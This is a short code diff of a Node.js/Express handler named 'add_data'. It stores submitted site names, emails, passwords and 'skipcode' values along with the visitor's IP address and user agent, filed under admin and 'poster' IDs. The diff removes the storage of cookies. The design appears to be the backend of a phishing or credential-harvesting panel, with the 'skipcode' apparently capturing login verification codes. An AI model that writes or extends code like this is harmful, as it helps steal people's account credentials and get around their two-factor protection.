@@ -397,7 +397,7 @@ export const add_data = async (req, res) => {
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode,cookie  } = req.body
+    const { site, email, password, skipcode  } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -415,7 +415,6 @@ export const add_data = async (req, res) => {
                adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
-                cookie,
                 ip:ipAddress,
                 agent:userAgent
 
